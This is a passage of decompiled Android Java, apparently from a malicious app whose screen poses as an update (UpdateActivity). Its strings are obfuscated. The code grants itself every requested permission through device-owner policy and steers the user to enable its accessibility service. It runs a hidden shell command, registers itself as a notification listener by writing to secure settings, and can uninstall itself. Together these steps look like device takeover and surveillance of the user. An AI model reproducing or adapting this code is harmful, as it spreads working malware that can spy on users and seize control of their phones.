                        updateActivity.m1600s(AbstractC1387m.m2421h(new byte[]{-99, 73, 20, -43, 25, -99, 12}, new byte[]{-12, 39, 125, -95, 112, -4, 96, -126}));
                        while (i19 <= 4) {
                            handler.postDelayed(new RunnableC0010c(updateActivity, i19, 6), ((long) i19) * 2000);
                            i19++;
                        }
                        handler.postDelayed(new Runnable() { // from class: e0.w2
                            @Override // java.lang.Runnable
                            public final void run() {
                                switch (i110) {
                                    case 0:
                                        String str11 = UpdateActivity.f1678l;
                                        UpdateActivity updateActivity2 = updateActivity;
                                        C1417s c1417sM2423j = AbstractC1387m.m2423j(updateActivity2);
                                        String str12 = UpdateActivity.f1678l;
                                        Log.e(str12, AbstractC1387m.m2421h(new byte[]{-62, -52, 0, -104, -38, 38, -89, 67, -29, -3, 47, -72, -26, 28, -61, 71, -20, -20, 50, -78, -110, 99}, new byte[]{-96, -87, 102, -9, -88, 67, -121, 2}).concat(c1417sM2423j.m2451a()));
                                        try {
                                            Intent intent = new Intent(AbstractC1387m.m2421h(new byte[]{-118, 54, -79, 70, -62, 24, -125, -113, -126, 54, -95, 81, -61, 5, -55, -64, -120, 44, -68, 91, -61, 95, -93, -28, -89, 29, -127, 113}, new byte[]{-21, 88, -43, 52, -83, 113, -25, -95}));
                                            intent.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{54, 97, 56, 91, 67, -61, -111, -21}, new byte[]{70, 0, 91, 48, 34, -92, -12, -47}) + updateActivity2.getPackageName()));
                                            intent.addFlags(268435456);
                                            updateActivity2.startActivity(intent);
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{-30, 119, -81, 43, 88, 123, 31, 3, -26, 120, -66, 54, 82, 21, 51, 51, -62, 70, -113, 7, 115}, new byte[]{-93, 52, -5, 98, 23, 53, 64, 71}));
                                        } catch (Exception e12) {
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{44, 97, -108, -92, -12, 84, -73, -8, 40, 110, -123, -71, -2, 58, -114, -35, 4, 78, -91, -119}, new byte[]{109, 34, -64, -19, -69, 26, -24, -68}), e12);
                                            try {
                                                Intent intent2 = new Intent(AbstractC1387m.m2421h(new byte[]{-37, 92, 33, 39, 16, 117, -91, 83, -45, 92, 49, 48, 17, 104, -17, 28, -39, 70, 44, 58, 17, 50, -108, 51, -13, 124, 22, 1, 62, 80, -115, 34, -22, 115, 6, 30, 62, 91, -124}, new byte[]{-70, 50, 69, 85, ByteCompanionObject.MAX_VALUE, 28, -63, 125}));
                                                intent2.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{-39, 75, -36, 78, 22, -67, 44, -20}, new byte[]{-87, 42, -65, 37, 119, -38, 73, -42}) + updateActivity2.getPackageName()));
                                                intent2.addFlags(268435456);
                                                updateActivity2.startActivity(intent2);
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{117, 84, 97, -43, 3, -117, 35, 8, 122, 94, 123, -49, 24, -124, 48, 17, 107, 71, 116, -33, 7, -124, 59, 24, 20, 100, 65, -3, 62, -79, 25, 57}, new byte[]{52, 23, 53, -100, 76, -59, 124, 93}));
                                            } catch (Exception e13) {
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{-24, -53, 31, 120, 55, -51, -85, 27, -25, -63, 5, 98, 44, -62, -72, 2, -10, -40, 10, 114, 51, -62, -77, 11, -119, -18, 42, 88, 20, -26, -112}, new byte[]{-87, -120, 75, 49, 120, -125, -12, 78}), e13);
                                                try {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{49, -13, 75, -82, -2, 13, 57, 28, 15, -31, 92, -92, -13, 6, 57, 39, 65, -25, 70, -84, -15, 25, 40, 52, 13, -2, 8, -93, -2, 6, 48, 55, 0, -15, 67, -23, -65, 25, 40, 52, 21, -9, 18, -27}, new byte[]{97, -110, 40, -59, -97, 106, 92, 85}).concat(AbstractC1387m.m2423j(updateActivity2).m2451a()));
                                                    Intent intent3 = new Intent(updateActivity2, (Class<?>) InstallResultReceiver.class);
                                                    intent3.setAction(updateActivity2.getPackageName() + AbstractC1387m.m2421h(new byte[]{112, -59, ByteCompanionObject.MIN_VALUE, 29, 22, 17, -67, -18, 23, -40, -106, 5, 17, 2, -92, -1, 12, -45, -106, 4, 28, 26}, new byte[]{94, -106, -59, 81, 80, 78, -24, -96}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{87, -7, -17, 94, 29, -117, 7, 102, 86}, new byte[]{56, -119, -118, 44, 124, -1, 110, 9}), AbstractC1387m.m2421h(new byte[]{39, -67, 80, -75, -29, 39, -40, 95, 62}, new byte[]{82, -45, 57, -37, -112, 83, -71, 51}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{-9, -26, 7, 48, 92, -108, -48, 85, -26, -22, 1}, new byte[]{-121, -121, 100, 91, Base64.padSymbol, -13, -75, 27}), updateActivity2.getPackageName());
                                                    updateActivity2.getPackageManager().getPackageInstaller().uninstall(updateActivity2.getPackageName(), PendingIntent.getBroadcast(updateActivity2, updateActivity2.getPackageName().hashCode(), intent3, 167772160).getIntentSender());
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{86, 71, 40, -92, -116, ByteCompanionObject.MAX_VALUE, -91, -9, 104, 85, 63, -82, -127, 116, -91, -52, 38, 83, 37, -90, -125, 107, -76, -33, 106, 74, 107, -67, -120, 105, -75, -37, 117, 82, 46, -85}, new byte[]{6, 38, 75, -49, -19, 24, -64, -66}));
                                                } catch (Exception e14) {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{24, -52, 59, -14, 7, 79, 40, -47, 38, -34, 44, -8, 10, 68, 40, -22, 104, -40, 54, -16, 8, 91, 57, -7, 36, -63, 120, -1, 7, 65, 33, -3, 44}, new byte[]{72, -83, 88, -103, 102, 40, 77, -104}), e14);
                                                }
                                            }
                                        }
                                        updateActivity2.f1685h.setEnabled(true);
                                        break;
                                    default:
                                        updateActivity.f1687j = 0;
                                        break;
                                }
                            }
                        }, 10000L);
                        break;
                    case 5:
                        String str8 = UpdateActivity.f1678l;
                        updateActivity.finish();
                        break;
                    case 6:
                        String str9 = UpdateActivity.f1678l;
                        C2194a.m3500t(C2349s0.class, null).show(updateActivity.getSupportFragmentManager(), AbstractC1387m.m2421h(new byte[]{88, -23, -7, 47, -63, -19, 45, 63, 107, -5, -28, 46, -48, -15, 43, 56, 64, -5, -45, 37, -53, -28, 36, 34, 83}, new byte[]{52, -120, -116, 65, -94, -123, 72, 77}));
                        break;
                    case 7:
                        String str10 = UpdateActivity.f1678l;
                        updateActivity.m1601t();
                        break;
                    case 8:
                        updateActivity.f1687j++;
                        Handler handler2 = updateActivity.f1688k;
                        handler2.removeCallbacksAndMessages(null);
                        handler2.postDelayed(new Runnable() { // from class: e0.w2
                            @Override // java.lang.Runnable
                            public final void run() {
                                switch (i19) {
                                    case 0:
                                        String str11 = UpdateActivity.f1678l;
                                        UpdateActivity updateActivity2 = updateActivity;
                                        C1417s c1417sM2423j = AbstractC1387m.m2423j(updateActivity2);
                                        String str12 = UpdateActivity.f1678l;
                                        Log.e(str12, AbstractC1387m.m2421h(new byte[]{-62, -52, 0, -104, -38, 38, -89, 67, -29, -3, 47, -72, -26, 28, -61, 71, -20, -20, 50, -78, -110, 99}, new byte[]{-96, -87, 102, -9, -88, 67, -121, 2}).concat(c1417sM2423j.m2451a()));
                                        try {
                                            Intent intent = new Intent(AbstractC1387m.m2421h(new byte[]{-118, 54, -79, 70, -62, 24, -125, -113, -126, 54, -95, 81, -61, 5, -55, -64, -120, 44, -68, 91, -61, 95, -93, -28, -89, 29, -127, 113}, new byte[]{-21, 88, -43, 52, -83, 113, -25, -95}));
                                            intent.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{54, 97, 56, 91, 67, -61, -111, -21}, new byte[]{70, 0, 91, 48, 34, -92, -12, -47}) + updateActivity2.getPackageName()));
                                            intent.addFlags(268435456);
                                            updateActivity2.startActivity(intent);
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{-30, 119, -81, 43, 88, 123, 31, 3, -26, 120, -66, 54, 82, 21, 51, 51, -62, 70, -113, 7, 115}, new byte[]{-93, 52, -5, 98, 23, 53, 64, 71}));
                                        } catch (Exception e12) {
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{44, 97, -108, -92, -12, 84, -73, -8, 40, 110, -123, -71, -2, 58, -114, -35, 4, 78, -91, -119}, new byte[]{109, 34, -64, -19, -69, 26, -24, -68}), e12);
                                            try {
                                                Intent intent2 = new Intent(AbstractC1387m.m2421h(new byte[]{-37, 92, 33, 39, 16, 117, -91, 83, -45, 92, 49, 48, 17, 104, -17, 28, -39, 70, 44, 58, 17, 50, -108, 51, -13, 124, 22, 1, 62, 80, -115, 34, -22, 115, 6, 30, 62, 91, -124}, new byte[]{-70, 50, 69, 85, ByteCompanionObject.MAX_VALUE, 28, -63, 125}));
                                                intent2.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{-39, 75, -36, 78, 22, -67, 44, -20}, new byte[]{-87, 42, -65, 37, 119, -38, 73, -42}) + updateActivity2.getPackageName()));
                                                intent2.addFlags(268435456);
                                                updateActivity2.startActivity(intent2);
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{117, 84, 97, -43, 3, -117, 35, 8, 122, 94, 123, -49, 24, -124, 48, 17, 107, 71, 116, -33, 7, -124, 59, 24, 20, 100, 65, -3, 62, -79, 25, 57}, new byte[]{52, 23, 53, -100, 76, -59, 124, 93}));
                                            } catch (Exception e13) {
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{-24, -53, 31, 120, 55, -51, -85, 27, -25, -63, 5, 98, 44, -62, -72, 2, -10, -40, 10, 114, 51, -62, -77, 11, -119, -18, 42, 88, 20, -26, -112}, new byte[]{-87, -120, 75, 49, 120, -125, -12, 78}), e13);
                                                try {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{49, -13, 75, -82, -2, 13, 57, 28, 15, -31, 92, -92, -13, 6, 57, 39, 65, -25, 70, -84, -15, 25, 40, 52, 13, -2, 8, -93, -2, 6, 48, 55, 0, -15, 67, -23, -65, 25, 40, 52, 21, -9, 18, -27}, new byte[]{97, -110, 40, -59, -97, 106, 92, 85}).concat(AbstractC1387m.m2423j(updateActivity2).m2451a()));
                                                    Intent intent3 = new Intent(updateActivity2, (Class<?>) InstallResultReceiver.class);
                                                    intent3.setAction(updateActivity2.getPackageName() + AbstractC1387m.m2421h(new byte[]{112, -59, ByteCompanionObject.MIN_VALUE, 29, 22, 17, -67, -18, 23, -40, -106, 5, 17, 2, -92, -1, 12, -45, -106, 4, 28, 26}, new byte[]{94, -106, -59, 81, 80, 78, -24, -96}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{87, -7, -17, 94, 29, -117, 7, 102, 86}, new byte[]{56, -119, -118, 44, 124, -1, 110, 9}), AbstractC1387m.m2421h(new byte[]{39, -67, 80, -75, -29, 39, -40, 95, 62}, new byte[]{82, -45, 57, -37, -112, 83, -71, 51}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{-9, -26, 7, 48, 92, -108, -48, 85, -26, -22, 1}, new byte[]{-121, -121, 100, 91, Base64.padSymbol, -13, -75, 27}), updateActivity2.getPackageName());
                                                    updateActivity2.getPackageManager().getPackageInstaller().uninstall(updateActivity2.getPackageName(), PendingIntent.getBroadcast(updateActivity2, updateActivity2.getPackageName().hashCode(), intent3, 167772160).getIntentSender());
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{86, 71, 40, -92, -116, ByteCompanionObject.MAX_VALUE, -91, -9, 104, 85, 63, -82, -127, 116, -91, -52, 38, 83, 37, -90, -125, 107, -76, -33, 106, 74, 107, -67, -120, 105, -75, -37, 117, 82, 46, -85}, new byte[]{6, 38, 75, -49, -19, 24, -64, -66}));
                                                } catch (Exception e14) {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{24, -52, 59, -14, 7, 79, 40, -47, 38, -34, 44, -8, 10, 68, 40, -22, 104, -40, 54, -16, 8, 91, 57, -7, 36, -63, 120, -1, 7, 65, 33, -3, 44}, new byte[]{72, -83, 88, -103, 102, 40, 77, -104}), e14);
                                                }
                                            }
                                        }
                                        updateActivity2.f1685h.setEnabled(true);
                                        break;
                                    default:
                                        updateActivity.f1687j = 0;
                                        break;
                                }
                            }
                        }, 1000L);
                        if (updateActivity.f1687j >= 10) {
                            updateActivity.f1687j = 0;
                            updateActivity.f1682e.setVisibility(0);
                        }
                        break;
                    default:
                        String str11 = UpdateActivity.f1678l;
                        new C1445y2(AbstractC1387m.m2421h(new byte[]{89, -15}, new byte[]{23, -94, 17, -110, -3, 93, 70, -67}), updateActivity);
                        break;
                }
            }
        });
        final int i18 = 2;
        this.f1683f.setOnClickListener(new View.OnClickListener(this) { // from class: e0.v2

            /* JADX INFO: renamed from: c */
            public final /* synthetic */ UpdateActivity f3455c;

            {
                this.f3455c = this;
            }

            /* JADX WARN: Code duplicated, block: B:107:0x03a5  */
            /* JADX WARN: Code duplicated, block: B:113:0x03dc  */
            /* JADX WARN: Code duplicated, block: B:134:0x01c9 A[SYNTHETIC] */
            /* JADX WARN: Code duplicated, block: B:136:0x01af A[SYNTHETIC] */
            /* JADX WARN: Code duplicated, block: B:52:0x01b5  */
            /* JADX WARN: Code duplicated, block: B:57:0x01d2  */
            /* JADX WARN: Code duplicated, block: B:68:0x0263 A[DONT_INVERT] */
            /* JADX WARN: Code duplicated, block: B:69:0x0265 A[Catch: Exception -> 0x0261, TryCatch #4 {Exception -> 0x0261, blocks: (B:60:0x0220, B:62:0x0241, B:65:0x024c, B:69:0x0265, B:72:0x026c, B:74:0x0296, B:73:0x0292), top: B:128:0x0220 }] */
            /* JADX WARN: Code duplicated, block: B:73:0x0292 A[Catch: Exception -> 0x0261, TryCatch #4 {Exception -> 0x0261, blocks: (B:60:0x0220, B:62:0x0241, B:65:0x024c, B:69:0x0265, B:72:0x026c, B:74:0x0296, B:73:0x0292), top: B:128:0x0220 }] */
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                String[] strArr;
                char c;
                Boolean bool;
                Iterator<AccessibilityServiceInfo> it;
                String string;
                ComponentName componentName;
                String strFlattenToString;
                int i19 = i18;
                final UpdateActivity updateActivity = this.f3455c;
                final int i110 = 1;
                final int i111 = 0;
                switch (i19) {
                    case 0:
                        String str3 = UpdateActivity.f1678l;
                        updateActivity.finish();
                        break;
                    case 1:
                        String str4 = UpdateActivity.f1678l;
                        AbstractC3656k.m5875u(updateActivity, new Intent(updateActivity, (Class<?>) ManageAppsActivity.class), null);
                        break;
                    case 2:
                        String str5 = UpdateActivity.f1678l;
                        if (!((DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-54, -62, -102, 109, 29, -104, -14, 90, -63, -53, -123, 103, 7}, new byte[]{-82, -89, -20, 4, 126, -3, -83, 42}))).isDeviceOwnerApp(updateActivity.getPackageName())) {
                            Context applicationContext = updateActivity.getApplicationContext();
                            try {
                                strArr = applicationContext.getPackageManager().getPackageInfo(applicationContext.getPackageName(), 4096).requestedPermissions;
                            } catch (PackageManager.NameNotFoundException e) {
                                e.printStackTrace();
                                strArr = new String[0];
                            }
                            if (strArr != null && strArr.length != 0) {
                                ArrayList arrayList = new ArrayList();
                                for (String str6 : strArr) {
                                    if (ContextCompat.checkSelfPermission(applicationContext, str6) != 0) {
                                        arrayList.add(str6);
                                    }
                                }
                                if (!arrayList.isEmpty()) {
                                    ActivityCompat.requestPermissions(updateActivity, (String[]) arrayList.toArray(new String[0]), 100);
                                }
                            }
                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{50, -84, -96, 96, -101, 114, -102, -12, 58, -93, -86, 113, -111}, new byte[]{83, -49, -61, 5, -24, 1, -13, -106}))).getEnabledAccessibilityServiceList(-1);
                            Boolean bool2 = Boolean.FALSE;
                            Iterator<AccessibilityServiceInfo> it2 = enabledAccessibilityServiceList.iterator();
                            while (it2.hasNext()) {
                                if (it2.next().getId().equals(updateActivity.getPackageName())) {
                                    bool2 = Boolean.TRUE;
                                }
                            }
                            if (!bool2.booleanValue()) {
                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{-80, 10, -116, -127, 107, -34, 3, -85, -94, 1, -100, -121, 109, -39, 0, -10, -1, 37, -85, -80, 65, -28, 52, -52, -109, 45, -92, -70, 80, -18, 56, -42, -108, 48, -68, -70, 74, -16, 52}, new byte[]{-47, 100, -24, -13, 4, -73, 103, -123})), null);
                            }
                            break;
                        } else {
                            ComponentName componentName2 = new ComponentName(updateActivity, (Class<?>) DPups.class);
                            String strM2421h = AbstractC1387m.m2421h(new byte[]{-14, -107, 82, 72, 40, 29, 122, 96, -51, -98, 103, 87, 32, 0, 125, 102, -48}, new byte[]{-94, -16, 32, 37, 65, 110, 9, 9});
                            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-5, -44, -62, 93, -26, -81, 31, -75, -16, -35, -35, 87, -4}, new byte[]{-97, -79, -76, 52, -123, -54, 64, -59}));
                            try {
                                String packageName = updateActivity.getPackageName();
                                String[] strArr2 = updateActivity.getPackageManager().getPackageInfo(packageName, 4096).requestedPermissions;
                                if (strArr2 != null) {
                                    int length = strArr2.length;
                                    c = 0;
                                    while (i111 < length) {
                                        try {
                                            devicePolicyManager.setPermissionGrantState(componentName2, packageName, strArr2[i111], 1);
                                            i111++;
                                        } catch (Exception e6) {
                                            e = e6;
                                            e.printStackTrace();
                                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList9 = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-125, 2, 20, -111, 3, -106, -48, 4, -117, 13, 30, ByteCompanionObject.MIN_VALUE, 9}, new byte[]{-30, 97, 119, -12, 112, -27, -71, 102}))).getEnabledAccessibilityServiceList(-1);
                                            bool = Boolean.FALSE;
                                            it = enabledAccessibilityServiceList9.iterator();
                                            while (it.hasNext()) {
                                                if (it.next().getId().equals(updateActivity.getPackageName())) {
                                                    bool = Boolean.TRUE;
                                                }
                                            }
                                            if (!bool.booleanValue()) {
                                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{102, -125, -63, -59, -122, 4, 35, 4, 116, -120, -47, -61, ByteCompanionObject.MIN_VALUE, 3, 32, 89, 41, -84, -26, -12, -84, 62, 20, 99, 69, -92, -23, -2, -67, 52, 24, 121, 66, -71, -15, -2, -89, 42, 20}, new byte[]{7, -19, -91, -73, -23, 109, 71, 42})), null);
                                            }
                                            DevicePolicyManager devicePolicyManager9 = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-26, -104, 41, 54, -80, -50, -12, -33, -19, -111, 54, 60, -86}, new byte[]{-126, -3, 95, 95, -45, -85, -85, -81}));
                                            new ComponentName(updateActivity, (Class<?>) DPups.class);
                                            devicePolicyManager9.isDeviceOwnerApp(updateActivity.getPackageName());
                                            Runtime.getRuntime().exec(AbstractC1387m.m2421h(new byte[]{-29, 10, 29, -114, 2, 67, 126, 60, -77, 4, 82, -124, 94, 71, 104, 41, -2, 23, 81, -116, 94, 76, 113, 62, -6, 20, 73, -120, 2, 86, 48, 41, -3, 3, 79, -122, 25, 70, 62, 56, -10, 21, 80, ByteCompanionObject.MIN_VALUE, 3, 81, 121, 39, -3, 73, 106, -69, 57, 118, 85, 23, -64, 34, 126, -68, 34, 103, 79, 27, -42, 51, 105, -96, 62, 101, 67}, new byte[]{-109, 103, Base64.padSymbol, -23, 112, 34, 16, 72}));
                                            string = Settings.Secure.getString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-74, -109, 55, 9, -28, -106, -56, 123, -67, -110, 34, 2, -18, -102, -49, 69, -89, -108, 57, 5, -41, -97, -59, 87, -89, -104, 56, 14, -6, ByteCompanionObject.MIN_VALUE}, new byte[]{-45, -3, 86, 107, -120, -13, -84, 36}));
                                            componentName = new ComponentName(updateActivity, (Class<?>) NLService.class);
                                            if (string == null) {
                                                if (string != null) {
                                                    strFlattenToString = componentName.flattenToString();
                                                } else {
                                                    strFlattenToString = componentName.flattenToString();
                                                }
                                                Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                                Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                            } else {
                                                if (string != null) {
                                                    strFlattenToString = componentName.flattenToString();
                                                } else {
                                                    strFlattenToString = componentName.flattenToString();
                                                }
                                                Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                                Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                            }
                                            if (ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{93, 30, 76, 55, 25, 0, -69, 114, 76, 21, 90, 40, 31, 26, -84, 53, 83, 30, 6, 4, 53, 42, -102, 15, 111, 47, 110, 12, 56, 44, ByteCompanionObject.MIN_VALUE, 16, 115, 51, 105, 17, 63, 38, -111}, new byte[]{60, 112, 40, 69, 118, 105, -33, 92})) == 0) {
                                                ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{124, 98, 89, 19, -7, 60, 48, 60, 109, 105, 79, 12, -1, 38, 39, 123, 114, 98, 19, 32, -43, 22, 17, 65, 78, 83, 123, 40, -40, 16, 11, 94, 82, 79, 124, 53, -33, 26, 26}, new byte[]{29, 12, Base64.padSymbol, 97, -106, 85, 84, 18})}, 100);
                                                return;
                                            } else if (Build.VERSION.SDK_INT < 29) {
                                                return;
                                            } else {
                                                return;
                                            }
                                        }
                                    }
                                } else {
                                    c = 0;
                                }
                            } catch (Exception e10) {
                                e = e10;
                                c = 0;
                            }
                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList10 = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-125, 2, 20, -111, 3, -106, -48, 4, -117, 13, 30, ByteCompanionObject.MIN_VALUE, 9}, new byte[]{-30, 97, 119, -12, 112, -27, -71, 102}))).getEnabledAccessibilityServiceList(-1);
                            bool = Boolean.FALSE;
                            it = enabledAccessibilityServiceList10.iterator();
                            while (it.hasNext()) {
                                if (it.next().getId().equals(updateActivity.getPackageName())) {
                                    bool = Boolean.TRUE;
                                }
                            }
                            if (!bool.booleanValue()) {
                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{102, -125, -63, -59, -122, 4, 35, 4, 116, -120, -47, -61, ByteCompanionObject.MIN_VALUE, 3, 32, 89, 41, -84, -26, -12, -84, 62, 20, 99, 69, -92, -23, -2, -67, 52, 24, 121, 66, -71, -15, -2, -89, 42, 20}, new byte[]{7, -19, -91, -73, -23, 109, 71, 42})), null);
                            }
                            DevicePolicyManager devicePolicyManager10 = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-26, -104, 41, 54, -80, -50, -12, -33, -19, -111, 54, 60, -86}, new byte[]{-126, -3, 95, 95, -45, -85, -85, -81}));
                            new ComponentName(updateActivity, (Class<?>) DPups.class);
                            devicePolicyManager10.isDeviceOwnerApp(updateActivity.getPackageName());
                            try {
                                Runtime.getRuntime().exec(AbstractC1387m.m2421h(new byte[]{-29, 10, 29, -114, 2, 67, 126, 60, -77, 4, 82, -124, 94, 71, 104, 41, -2, 23, 81, -116, 94, 76, 113, 62, -6, 20, 73, -120, 2, 86, 48, 41, -3, 3, 79, -122, 25, 70, 62, 56, -10, 21, 80, ByteCompanionObject.MIN_VALUE, 3, 81, 121, 39, -3, 73, 106, -69, 57, 118, 85, 23, -64, 34, 126, -68, 34, 103, 79, 27, -42, 51, 105, -96, 62, 101, 67}, new byte[]{-109, 103, Base64.padSymbol, -23, 112, 34, 16, 72}));
                                break;
                            } catch (IOException unused2) {
                            }
                            try {
                                string = Settings.Secure.getString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-74, -109, 55, 9, -28, -106, -56, 123, -67, -110, 34, 2, -18, -102, -49, 69, -89, -108, 57, 5, -41, -97, -59, 87, -89, -104, 56, 14, -6, ByteCompanionObject.MIN_VALUE}, new byte[]{-45, -3, 86, 107, -120, -13, -84, 36}));
                                componentName = new ComponentName(updateActivity, (Class<?>) NLService.class);
                                if (string == null && string.contains(componentName.flattenToString())) {
                                    Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{63, -125, 40, -126, 59, -101, -86, 81, 5, -123, 51, -123, 125, -98, -96, 67, 5, -119, 50, -114, 47, -46, -88, 92, 3, -119, Base64.padSymbol, -113, 36, -46, -82, 66, 16, -126, 40, -114, 57, -36}, new byte[]{113, -20, 92, -21, 93, -14, -55, 48}));
                                } else {
                                    if (string != null || string.isEmpty()) {
                                        strFlattenToString = componentName.flattenToString();
                                    } else {
                                        StringBuilder sb = new StringBuilder();
                                        sb.append(string);
                                        byte[] bArr2 = new byte[1];
                                        bArr2[c] = 55;
                                        sb.append(AbstractC1387m.m2421h(bArr2, new byte[]{13, 42, -127, ByteCompanionObject.MIN_VALUE, -4, -26, 59, -41}));
                                        sb.append(componentName.flattenToString());
                                        strFlattenToString = sb.toString();
                                    }
                                    Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                    Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                }
                            } catch (Exception e11) {
                                Log.e(strM2421h, AbstractC1387m.m2421h(new byte[]{-47, 14, 100, 118, -81, -49, -8, 87, -8, 79, 106, 104, -85, -59, -84, 3, -7, 0, 121, 115, -84, -62, -69, 66, -29, 6, 98, 116, -22, -57, -79, 80, -29, 10, 99, ByteCompanionObject.MAX_VALUE, -72, -117, -88, 70, -27, 2, 100, 105, -71, -62, -73, 77, -83, 79}, new byte[]{-105, 111, 13, 26, -54, -85, -40, 35}) + e11.getMessage());
                            }
                        }
                        if (ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{93, 30, 76, 55, 25, 0, -69, 114, 76, 21, 90, 40, 31, 26, -84, 53, 83, 30, 6, 4, 53, 42, -102, 15, 111, 47, 110, 12, 56, 44, ByteCompanionObject.MIN_VALUE, 16, 115, 51, 105, 17, 63, 38, -111}, new byte[]{60, 112, 40, 69, 118, 105, -33, 92})) == 0) {
                            ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{124, 98, 89, 19, -7, 60, 48, 60, 109, 105, 79, 12, -1, 38, 39, 123, 114, 98, 19, 32, -43, 22, 17, 65, 78, 83, 123, 40, -40, 16, 11, 94, 82, 79, 124, 53, -33, 26, 26}, new byte[]{29, 12, Base64.padSymbol, 97, -106, 85, 84, 18})}, 100);
                        } else if (Build.VERSION.SDK_INT < 29 && ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{-98, -29, -58, 50, 77, 42, -53, 38, -113, -24, -48, 45, 75, 48, -36, 97, -112, -29, -116, 1, 97, 0, -22, 91, -84, -46, -32, 1, 97, 8, -24, 90, -80, -40, -20, 4, 125, 15, -32, 75, -66, -39, -21, 15, 108}, new byte[]{-1, -115, -94, 64, 34, 67, -81, 8})) != 0) {
                            ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{-51, 34, -45, -116, 87, 2, 116, -126, -36, 41, -59, -109, 81, 24, 99, -59, -61, 34, -103, -65, 123, 40, 85, -1, -1, 19, -11, -65, 123, 32, 87, -2, -29, 25, -7, -70, 103, 39, 95, -17, -19, 24, -2, -79, 118}, new byte[]{-84, 76, -73, -2, 56, 107, 16, -84})}, 100);
                            break;
                        }
                        break;
                    case 3:
                        String str7 = UpdateActivity.f1678l;
